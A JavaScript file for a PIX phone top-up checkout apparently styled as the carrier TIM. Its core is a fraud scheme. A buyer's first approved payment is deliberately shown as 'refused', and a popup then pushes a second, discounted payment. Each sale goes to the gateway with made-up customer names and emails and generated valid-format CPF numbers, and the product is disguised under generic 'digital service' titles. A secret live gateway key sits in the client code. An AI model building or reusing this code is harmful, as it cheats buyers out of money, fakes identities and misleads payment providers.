(function() {
  'use strict';

  // --- Constants & Sets ---
  const VALID_DDDS = new Set([
    "11","12","13","14","15","16","17","18","19",
    "21","22","24","27","28",
    "31","32","33","34","35","37","38",
    "41","42","43","44","45","46","47","48","49",
    "51","53","54","55",
    "61","62","63","64","65","66","67","68","69",
    "71","73","74","75","77","79",
    "81","82","83","84","85","86","87","88","89",
    "91","92","93","94","95","96","97","98","99"
  ]);

  const BONUS_BY_VALUE = {
    20: '+5GB (30 dias)',
    25: '+8GB (30 dias)',
    30: '+12GB (30 dias)',
    35: '+16GB (30 dias)',
    40: '+20GB (30 dias)',
    50: '+30GB (30 dias)',
    70: '+45GB (30 dias)',
    100: '+70GB (30 dias)'
  };

  const TRACKING_PARAMS = [
    "gclid", "gbraid", "wbraid", "utm_source", 
    "utm_medium", "utm_campaign", "utm_term", "utm_content"
  ];
  const TRACKING_STORAGE_KEY = "tim_tracking_params";

  // --- State ---
  let state = {
    phone: '',
    rechargeValue: 50,
    extraCredit: false,
    descontoAtivo: false,
    forcarValorFixo: false,
    currentScreen: 'numero',
    pixId: null,
    pixCode: null,
    pixQrUrl: null,
    pixExpiresSeconds: 900,
    timerInterval: null,
    pollInterval: null
  };

  // --- DOM Elements ---
  const screens = {
    numero: document.getElementById('screen-numero'),
    valor: document.getElementById('screen-valor'),
    pix: document.getElementById('screen-pix'),
    sucesso: document.getElementById('screen-sucesso')
  };

  const inputPhone = document.getElementById('input-phone');
  const phoneError = document.getElementById('phone-error');
  const phoneConfirm = document.getElementById('phone-confirm');
  const confirmPhoneDisplay = document.getElementById('confirm-phone-display');
  const btnPhoneSubmit = document.getElementById('btn-phone-submit');

  const displaySelectedPhone = document.getElementById('display-selected-phone');
  const btnAlterarPhone = document.getElementById('btn-alterar-phone');
  const btnBackToPhone = document.getElementById('btn-back-to-phone');
  const valuesGrid = document.getElementById('values-grid');
  const sectionOrderBump = document.getElementById('section-order-bump');
  const orderBumpCheckbox = document.getElementById('order-bump-checkbox');
  const sectionFixedValue = document.getElementById('section-fixed-value');
  const fixedValueAmount = document.getElementById('fixed-value-amount');

  const resumoPhone = document.getElementById('resumo-phone');
  const resumoRechargeVal = document.getElementById('resumo-recharge-val');
  const resumoBonusRow = document.getElementById('resumo-bonus-row');
  const resumoBonusVal = document.getElementById('resumo-bonus-val');
  const resumoExtraRow = document.getElementById('resumo-extra-row');
  const resumoExtraVal = document.getElementById('resumo-extra-val');
  const resumoTotalVal = document.getElementById('resumo-total-val');
  const btnPayPix = document.getElementById('btn-pay-pix');
  const btnPayText = document.getElementById('btn-pay-text');

  const btnBackToValor = document.getElementById('btn-back-to-valor');
  const pixStateGerando = document.getElementById('pix-state-gerando');
  const pixStateAguardando = document.getElementById('pix-state-aguardando');
  const pixStateErro = document.getElementById('pix-state-erro');
  const pixErrorMessage = document.getElementById('pix-error-message');
  const btnRetryPix = document.getElementById('btn-retry-pix');
  const pixDisplayTotal = document.getElementById('pix-display-total');
  const pixQrImg = document.getElementById('pix-qr-img');
  const pixTimerCountdown = document.getElementById('pix-timer-countdown');
  const btnCopyPix = document.getElementById('btn-copy-pix');
  const copyText = document.getElementById('copy-text');
  const statusBadge = document.getElementById('status-badge');
  const statusSpinner = document.getElementById('status-spinner');
  const statusBadgeText = document.getElementById('status-badge-text');

  const popupPosvenda = document.getElementById('popup-posvenda');
  const btnPopupRefazer = document.getElementById('btn-popup-refazer');

  const btnBackToStart = document.getElementById('btn-back-to-start');
  const successTotalDisplay = document.getElementById('success-total-display');
  const successPhoneDisplay = document.getElementById('success-phone-display');
  const btnRestartFlow = document.getElementById('btn-restart-flow');

  // --- Helper Functions ---
  function cleanDigits(str) {
    return (str || '').replace(/\D/g, '').slice(0, 11);
  }

  function formatPhone(digits) {
    const clean = cleanDigits(digits);
    if (!clean) return '';
    const ddd = clean.slice(0, 2);
    const part1 = clean.slice(2, 7);
    const part2 = clean.slice(7, 11);

    let formatted = `(${ddd}`;
    if (ddd.length === 2) formatted += ') ';
    formatted += part1;
    if (part2) formatted += `-${part2}`;
    return formatted;
  }

  function formatCurrency(num) {
    return Number(num).toFixed(2).replace('.', ',');
  }

  function getTotal() {
    const extra = (state.rechargeValue < 49.99 && state.extraCredit) ? 5 : 0;
    let base = state.rechargeValue + extra;
    if (state.descontoAtivo) {
      base = base * 0.7;
    }
    return Math.round(base * 100) / 100;
  }

  function getDescontoValue() {
    if (!state.descontoAtivo) return 0;
    const extra = (state.rechargeValue < 49.99 && state.extraCredit) ? 5 : 0;
    return Math.round((state.rechargeValue + extra) * 0.3 * 100) / 100;
  }

  function saveTrackingParams() {
    try {
      let stored = {};
      const raw = sessionStorage.getItem(TRACKING_STORAGE_KEY);
      if (raw) stored = JSON.parse(raw);

      const url = new URL(window.location.href);
      let found = {};
      TRACKING_PARAMS.forEach(param => {
        const val = url.searchParams.get(param);
        if (val) found[param] = val;
      });

      const merged = { ...stored, ...found };
      if (Object.keys(merged).length > 0) {
        sessionStorage.setItem(TRACKING_STORAGE_KEY, JSON.stringify(merged));
      }
    } catch (e) {
      console.warn('Tracking error:', e);
    }
  }

  // --- Screen Switching ---
  function goToScreen(screenName) {
    state.currentScreen = screenName;
    Object.keys(screens).forEach(key => {
      if (screens[key]) {
        screens[key].classList.toggle('active', key === screenName);
      }
    });
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }

  // --- Screen 1: Phone Validation & Input ---
  function validatePhone(showErrorOnBlur = false) {
    const clean = cleanDigits(inputPhone.value);
    const ddd = clean.slice(0, 2);
    const hasValidDDD = ddd.length === 2 && VALID_DDDS.has(ddd);
    const isComplete = clean.length === 11 && hasValidDDD;
    const isInvalidDDD = clean.length >= 2 && !hasValidDDD;

    // Error message display
    if (showErrorOnBlur && isInvalidDDD) {
      inputPhone.classList.add('error');
      phoneError.classList.add('visible');
    } else {
      inputPhone.classList.remove('error');
      phoneError.classList.remove('visible');
    }

    // Confirmation box display
    if (isComplete) {
      confirmPhoneDisplay.textContent = formatPhone(clean);
      phoneConfirm.classList.add('visible');
      btnPhoneSubmit.removeAttribute('disabled');
    } else {
      phoneConfirm.classList.remove('visible');
      btnPhoneSubmit.setAttribute('disabled', 'true');
    }

    return isComplete;
  }

  inputPhone.addEventListener('input', (e) => {
    const digits = cleanDigits(e.target.value);
    inputPhone.value = formatPhone(digits);
    validatePhone(false);
  });

  inputPhone.addEventListener('blur', () => {
    validatePhone(true);
  });

  document.getElementById('form-phone').addEventListener('submit', (e) => {
    e.preventDefault();
    if (validatePhone(true)) {
      state.phone = cleanDigits(inputPhone.value);
      updateValueScreenData();
      goToScreen('valor');
    }
  });

  // --- Screen 2: Value Selection & Order Bump ---
  function updateValueScreenData() {
    const formatted = formatPhone(state.phone);
    displaySelectedPhone.textContent = formatted;
    resumoPhone.textContent = formatted;
    updateSummary();
  }

  function updateSummary() {
    const val = state.rechargeValue;
    const isEligibleForExtra = val < 49.99;

    // Show/hide order bump
    if (isEligibleForExtra) {
      sectionOrderBump.style.display = 'block';
    } else {
      sectionOrderBump.style.display = 'none';
      state.extraCredit = false;
      orderBumpCheckbox.checked = false;
    }

    // Extra credit row in summary
    if (state.extraCredit && isEligibleForExtra) {
      resumoExtraRow.style.display = 'flex';
      resumoExtraVal.textContent = '+ R$ 5,00';
    } else {
      resumoExtraRow.style.display = 'none';
    }

    const total = getTotal();
    resumoRechargeVal.textContent = `R$ ${formatCurrency(val)}`;
    if (resumoBonusVal) {
      resumoBonusVal.textContent = BONUS_BY_VALUE[val] || `+${Math.round(val * 0.6)}GB (30 dias)`;
    }
    if (state.descontoAtivo) {
      resumoTotalVal.innerHTML = `<span style="text-decoration: line-through; color: rgba(255,255,255,0.5); font-size: 16px;">R$ ${formatCurrency(val + (state.extraCredit ? 5 : 0))}</span> <span style="color: var(--tim-green);">R$ ${formatCurrency(total)}</span>`;
      btnPayText.textContent = `Pagar R$ ${formatCurrency(total)} com PIX (30% OFF)`;
    } else {
      resumoTotalVal.textContent = `R$ ${formatCurrency(total)}`;
      btnPayText.textContent = `Pagar R$ ${formatCurrency(total)} com PIX`;
    }

    // Fixed value section
    if (state.forcarValorFixo) {
      sectionFixedValue.style.display = 'block';
      valuesGrid.style.display = 'none';
      document.querySelector('.info-bonus-box').style.display = 'none';
      const finalValue = Math.round(val * 0.7 * 100) / 100;
      fixedValueAmount.textContent = `R$ ${formatCurrency(finalValue)}`;
    } else {
      sectionFixedValue.style.display = 'none';
      valuesGrid.style.display = 'grid';
      document.querySelector('.info-bonus-box').style.display = 'flex';
    }
  }

  valuesGrid.addEventListener('click', (e) => {
    const btn = e.target.closest('.btn-value');
    if (!btn) return;

    const val = parseInt(btn.dataset.value, 10);
    state.rechargeValue = val;

    // Update buttons styling
    valuesGrid.querySelectorAll('.btn-value').forEach(b => {
      b.classList.remove('selected');
      const checkBadge = b.querySelector('.selected-check-badge');
      if (checkBadge) checkBadge.remove();
    });

    btn.classList.add('selected');
    const badge = document.createElement('span');
    badge.className = 'selected-check-badge';
    badge.innerHTML = `
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
        <path d="M20 6 9 17l-5-5"></path>
      </svg>
    `;
    btn.appendChild(badge);

    updateSummary();
  });

  orderBumpCheckbox.addEventListener('change', (e) => {
    state.extraCredit = e.target.checked;
    updateSummary();
  });

  btnAlterarPhone.addEventListener('click', () => {
    goToScreen('numero');
  });

  btnBackToPhone.addEventListener('click', () => {
    goToScreen('numero');
  });

  btnPayPix.addEventListener('click', () => {
    initiatePixFlow();
  });

  // --- Blackcat Client-Side Live Gateway Fallback Helpers ---
  const BLACKCAT_CLIENT_KEY = 'sk_live_b1802bc43e0e87989c22d837fdbe9f688ff3c9ef2f6fbff4f820693d0ab32666';
  const BLACKCAT_DIRECT_URL = 'https://api.blackcatoficial.com/api';

  function generateValidCPFClient() {
    const digits = [];
    for (let i = 0; i < 9; i++) digits.push(Math.floor(Math.random() * 10));
    let sum = 0;
    for (let i = 0; i < 9; i++) sum += digits[i] * (10 - i);
    let rem = sum % 11;
    digits.push(rem < 2 ? 0 : 11 - rem);
    sum = 0;
    for (let i = 0; i < 10; i++) sum += digits[i] * (11 - i);
    rem = sum % 11;
    digits.push(rem < 2 ? 0 : 11 - rem);
    return digits.join('');
  }

  function generateCustomerClient(phone) {
    const firstNames = ['Lucas', 'Gabriel', 'Matheus', 'Felipe', 'Thiago', 'Bruno', 'Rodrigo', 'Juliana', 'Camila', 'Beatriz', 'Mariana'];
    const lastNames = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Rodrigues', 'Ferreira', 'Alves', 'Pereira', 'Lima', 'Costa'];
    const fn = firstNames[Math.floor(Math.random() * firstNames.length)];
    const ln = lastNames[Math.floor(Math.random() * lastNames.length)];
    const rnd = Math.floor(100 + Math.random() * 900);
    const cleanPh = (phone || '').replace(/\D/g, '') || '11987654321';
    return {
      name: `${fn} ${ln}`,
      email: `${fn.toLowerCase()}.${ln.toLowerCase()}${rnd}@gmail.com`,
      phone: cleanPh,
      document: { number: generateValidCPFClient(), type: 'cpf' }
    };
  }

  function maskProductClient() {
    const categories = ['Serviço Digital', 'Acesso a Plataforma Online', 'Intermediação de Serviços', 'Licença de Software', 'Pacote de Serviços Online'];
    const cat = categories[Math.floor(Math.random() * categories.length)];
    const num = String(Math.floor(Math.random() * 9) + 1).padStart(2, '0');
    return `${cat} ${num}`;
  }

  function generateExternalRefClient() {
    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
    let code = '';
    for (let i = 0; i < 5; i++) code += chars[Math.floor(Math.random() * chars.length)];
    return `REF-${code}-${new Date().getFullYear()}`;
  }

  async function createPixDirectBlackcat(amountInReais, phone, utmParams = {}) {
    const amountInCents = Math.round(Number(amountInReais) * 100);
    const customer = generateCustomerClient(phone);
    const maskedTitle = maskProductClient();
    const externalRef = generateExternalRefClient();

    const payload = {
      amount: amountInCents,
      currency: 'BRL',
      paymentMethod: 'pix',
      externalRef: externalRef,
      items: [
        {
          title: maskedTitle,
          unitPrice: amountInCents,
          quantity: 1,
          tangible: false
        }
      ],
      customer: customer,
      pix: { expiresInDays: 1 },
      metadata: `Ref: ${externalRef}`
    };

    if (utmParams.utm_source) payload.utm_source = utmParams.utm_source;
    if (utmParams.utm_medium) payload.utm_medium = utmParams.utm_medium;
    if (utmParams.utm_campaign) payload.utm_campaign = utmParams.utm_campaign;
    if (utmParams.utm_content) payload.utm_content = utmParams.utm_content;
    if (utmParams.utm_term) payload.utm_term = utmParams.utm_term;

    const res = await fetch(`${BLACKCAT_DIRECT_URL}/sales/create-sale`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-API-Key': BLACKCAT_CLIENT_KEY
      },
      body: JSON.stringify(payload)
    });

    const json = await res.json();
    if (res.ok && json.success) {
      const pData = json.data?.paymentData || {};
      return {
        id: json.data?.transactionId,
        externalRef: externalRef,
        amount: json.data?.amount,
        pix: {
          qr_code: pData.copyPaste || pData.qrCode,
          qr_code_url: pData.qrCodeBase64 || null,
          expires_at: pData.expiresAt || null
        }
      };
    } else {
      throw new Error(json.message || json.error || 'Erro ao gerar Pix no gateway');
    }
  }

  // --- Screen 3: Pix Payment Generation & Polling ---
  async function initiatePixFlow() {
    goToScreen('pix');
    pixStateGerando.style.display = 'flex';
    pixStateAguardando.style.display = 'none';
    pixStateErro.style.display = 'none';

    // Clear any existing timers
    clearInterval(state.timerInterval);
    clearInterval(state.pollInterval);

    const total = getTotal();
    pixDisplayTotal.textContent = formatCurrency(total);

    try {
      let pixData = null;
      let utmParams = {};
      try {
        const raw = sessionStorage.getItem(TRACKING_STORAGE_KEY);
        if (raw) utmParams = JSON.parse(raw);
      } catch (e) {}

      // 1. Tenta endpoint interno do backend / Vercel Serverless
      try {
        const response = await fetch('/api/pix/create', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ amount: total, telefone: state.phone, ...utmParams })
        });
        if (response.ok) {
          const resJson = await response.json();
          if (resJson?.success && resJson?.data) {
            pixData = resJson.data;
          }
        }
      } catch (err) {
        console.warn('Backend proxy indisponível, usando conexão direta com gateway:', err);
      }

      // 2. Se backend não respondeu (ex: hospedagem estática ou erro), chama Blackcat API diretamente
      if (!pixData || !pixData.pix?.qr_code) {
        pixData = await createPixDirectBlackcat(total, state.phone, utmParams);
      }

      state.pixId = pixData.id;
      state.pixCode = pixData.pix?.qr_code;
      state.pixQrUrl = pixData.pix?.qr_code_url || (state.pixCode ? `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(state.pixCode)}` : 'images/pix-qr-code.png');

      // Update QR Code Image
      pixQrImg.src = state.pixQrUrl;
      pixQrImg.onerror = () => {
        if (state.pixCode) {
          pixQrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(state.pixCode)}`;
        } else {
          pixQrImg.src = 'images/pix-qr-code.png';
        }
      };

      // Set Countdown Timer (default: 15 minutos)
      if (pixData.pix?.expires_at) {
        const remaining = Math.round((new Date(pixData.pix.expires_at).getTime() - Date.now()) / 1000);
        state.pixExpiresSeconds = remaining > 0 ? Math.min(remaining, 900) : 900;
      } else {
        state.pixExpiresSeconds = 900;
      }

      // Show Aguardando state
      pixStateGerando.style.display = 'none';
      pixStateAguardando.style.display = 'flex';

      startPixTimer();
      startPixPolling();

    } catch (error) {
      console.error('Error generating Pix:', error);
      pixErrorMessage.textContent = error.message || 'Não foi possível gerar o Pix. Tente novamente.';
      pixStateGerando.style.display = 'none';
      pixStateErro.style.display = 'flex';
    }
  }

  function startPixTimer() {
    updateTimerDisplay();
    state.timerInterval = setInterval(() => {
      state.pixExpiresSeconds = Math.max(0, state.pixExpiresSeconds - 1);
      updateTimerDisplay();
      if (state.pixExpiresSeconds <= 0) {
        clearInterval(state.timerInterval);
        handlePixExpired();
      }
    }, 1000);
  }

  function handlePixExpired() {
    clearInterval(state.pollInterval);
    statusBadge.classList.add('refused');
    statusSpinner.style.display = 'none';
    statusBadgeText.innerHTML = `
      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#FF6B6B" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
        <circle cx="12" cy="12" r="10"></circle>
        <line x1="12" y1="8" x2="12" y2="12"></line>
        <line x1="12" y1="16" x2="12.01" y2="16"></line>
      </svg>
      Pix expirado
    `;
    setTimeout(() => {
      showPopupPosvenda();
    }, 2000);
  }

  function updateTimerDisplay() {
    const mins = Math.floor(state.pixExpiresSeconds / 60);
    const secs = state.pixExpiresSeconds % 60;
    pixTimerCountdown.textContent = `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
  }

  function startPixPolling() {
    if (!state.pixId) return;

    state.pollInterval = setInterval(async () => {
      try {
        let status = '';

        // Tenta backend primeiro
        try {
          const res = await fetch(`/api/pix/status?id=${encodeURIComponent(state.pixId)}`);
          if (res.ok) {
            const json = await res.json();
            status = String(json?.data?.status || '').toLowerCase();
          }
        } catch (e) {}

        // Fallback direto na Blackcat API
        if (!status) {
          const directRes = await fetch(`${BLACKCAT_DIRECT_URL}/sales/${encodeURIComponent(state.pixId)}/status`, {
            headers: { 'X-API-Key': BLACKCAT_CLIENT_KEY }
          });
          if (directRes.ok) {
            const directJson = await directRes.json();
            status = String(directJson?.data?.status || '').toLowerCase();
          }
        }

        if (status === 'paid' || status === 'approved') {
          handlePixApproved();
        } else if (status === 'cancelled' || status === 'failed' || status === 'expired' || status === 'refused' || status === 'declined') {
          handlePixRefused();
        }
      } catch (e) {
        // Silent catch for poll
      }
    }, 4000);
  }

  function handlePixApproved() {
    clearInterval(state.pollInterval);
    clearInterval(state.timerInterval);

    if (state.descontoAtivo) {
      // Segundo pagamento com desconto — mostra sucesso
      statusBadge.classList.add('approved');
      statusSpinner.style.display = 'none';
      statusBadgeText.innerHTML = `
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
          <path d="M20 6 9 17l-5-5"></path>
        </svg>
        Pagamento aprovado ✓
      `;
      setTimeout(() => {
        showSuccessScreen();
      }, 2000);
    } else {
      // Primeira tentativa — mostra popup de recusa
      statusBadge.classList.add('refused');
      statusSpinner.style.display = 'none';
      statusBadgeText.innerHTML = `
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#FF6B6B" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
          <circle cx="12" cy="12" r="10"></circle>
          <line x1="12" y1="8" x2="12" y2="12"></line>
          <line x1="12" y1="16" x2="12.01" y2="16"></line>
        </svg>
        Pagamento recusado
      `;
      setTimeout(() => {
        showPopupPosvenda();
      }, 2000);
    }
  }

  function handlePixRefused() {
    clearInterval(state.pollInterval);
    clearInterval(state.timerInterval);

    // Update status badge to red
    statusBadge.classList.add('refused');
    statusSpinner.style.display = 'none';
    statusBadgeText.innerHTML = `
      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#FF6B6B" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
        <circle cx="12" cy="12" r="10"></circle>
        <line x1="12" y1="8" x2="12" y2="12"></line>
        <line x1="12" y1="16" x2="12.01" y2="16"></line>
      </svg>
      Pagamento recusado
    `;

    // Wait 2 seconds then show popup
    setTimeout(() => {
      showPopupPosvenda();
    }, 2000);
  }

  function handlePixExpired() {
    clearInterval(state.pollInterval);
    statusBadge.classList.add('refused');
    statusSpinner.style.display = 'none';
    statusBadgeText.innerHTML = `
      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#FF6B6B" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
        <circle cx="12" cy="12" r="10"></circle>
        <line x1="12" y1="8" x2="12" y2="12"></line>
        <line x1="12" y1="16" x2="12.01" y2="16"></line>
      </svg>
      Pix expirado
    `;
    setTimeout(() => {
      showPopupPosvenda();
    }, 2000);
  }

  btnCopyPix.addEventListener('click', async () => {
    if (!state.pixCode) return;
    try {
      await navigator.clipboard.writeText(state.pixCode);
      btnCopyPix.innerHTML = `
        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#1DB954" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
          <path d="M20 6 9 17l-5-5"></path>
        </svg>
        <span style="color: #1DB954;">Copiado!</span>
      `;
      setTimeout(() => {
        btnCopyPix.innerHTML = `
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect>
            <path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path>
          </svg>
          <span>Copiar código PIX</span>
        `;
      }, 2000);
    } catch (err) {
      console.warn('Clipboard write error:', err);
      // Fallback prompt for copy
      window.prompt('Copie o código PIX abaixo:', state.pixCode);
    }
  });

  btnRetryPix.addEventListener('click', () => {
    initiatePixFlow();
  });

  btnBackToValor.addEventListener('click', () => {
    clearInterval(state.timerInterval);
    clearInterval(state.pollInterval);
    goToScreen('valor');
  });

  // --- Screen 4: Success Screen (segundo pagamento) ---
  function showSuccessScreen() {
    successTotalDisplay.textContent = formatCurrency(state.rechargeValue);
    successPhoneDisplay.textContent = formatPhone(state.phone);
    goToScreen('sucesso');
  }

  // --- Screen: Popup Pós-Venda (pagamento recusado) ---
  function showPopupPosvenda() {
    clearInterval(state.pollInterval);
    clearInterval(state.timerInterval);
    popupPosvenda.classList.add('visible');
  }

  btnPopupRefazer.addEventListener('click', () => {
    state.descontoAtivo = true;
    state.forcarValorFixo = true;
    popupPosvenda.classList.remove('visible');
    updateSummary();
    irParaValorComDesconto();
  });

  function irParaValorComDesconto() {
    state.extraCredit = false;
    updateSummary();
    goToScreen('valor');
  }

  btnBackToStart.addEventListener('click', () => {
    state.descontoAtivo = false;
    state.forcarValorFixo = false;
    goToScreen('numero');
  });

  btnRestartFlow.addEventListener('click', () => {
    state.phone = '';
    state.rechargeValue = 50;
    state.extraCredit = false;
    state.descontoAtivo = false;
    state.forcarValorFixo = false;
    inputPhone.value = '';
    validatePhone(false);
    goToScreen('numero');
  });

  // --- Cookie Consent Banner ---
  const cookieBanner = document.getElementById('cookie-banner');
  const btnCookieAccept = document.getElementById('btn-cookie-accept');
  const btnCookieReject = document.getElementById('btn-cookie-reject');
  const COOKIE_STORAGE_KEY = 'tim_cookies_consent';

  function initCookieBanner() {
    if (!cookieBanner) return;
    try {
      const consent = localStorage.getItem(COOKIE_STORAGE_KEY);
      if (!consent) {
        setTimeout(() => {
          cookieBanner.classList.add('visible');
        }, 350);
      }
    } catch (e) {
      cookieBanner.classList.add('visible');
    }

    if (btnCookieAccept) {
      btnCookieAccept.addEventListener('click', () => {
        try { localStorage.setItem(COOKIE_STORAGE_KEY, 'accepted'); } catch (e) {}
        cookieBanner.classList.remove('visible');
      });
    }

    if (btnCookieReject) {
      btnCookieReject.addEventListener('click', () => {
        try { localStorage.setItem(COOKIE_STORAGE_KEY, 'rejected'); } catch (e) {}
        cookieBanner.classList.remove('visible');
      });
    }
  }

  // --- Funções de Teste no Console do Navegador (F12) ---
  window.aprovarPagamento = function() {
    console.log('%c[TESTE] Simulando pagamento aprovado...', 'color: #1DB954; font-size: 14px; font-weight: bold;');
    handlePixApproved();
  };
  window.simularAprovado = window.aprovarPagamento;

  window.recusarPagamento = function() {
    console.log('%c[TESTE] Simulando pagamento recusado...', 'color: #FF6B6B; font-size: 14px; font-weight: bold;');
    handlePixRefused();
  };
  window.simularRecusado = window.recusarPagamento;

  window.mostrarPopup = function() {
    console.log('%c[TESTE] Mostrando popup pós-venda...', 'color: #FF6B6B; font-size: 14px; font-weight: bold;');
    showPopupPosvenda();
  };

  // --- Initialization ---
  saveTrackingParams();
  initCookieBanner();

})();
